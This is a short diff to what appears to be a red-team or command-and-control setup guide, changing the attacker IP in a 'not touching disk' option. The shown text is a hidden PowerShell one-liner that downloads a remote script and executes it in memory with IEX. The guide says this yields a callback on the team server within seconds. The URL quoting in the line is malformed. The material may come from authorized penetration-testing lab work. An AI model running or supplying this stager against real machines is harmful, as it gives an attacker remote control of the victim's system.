@@ -84,7 +84,7 @@ Option 2 (not touching disk)
 
 Target VM
      Open Terminal and paste
-     powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(172.16.100.32:80/a'))"
+     powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(10.0.0.10:80/a'))"
      In about 5 sec, you should have a callback on the team server.
 ------------------------------------------------------------------------------------------------------
 
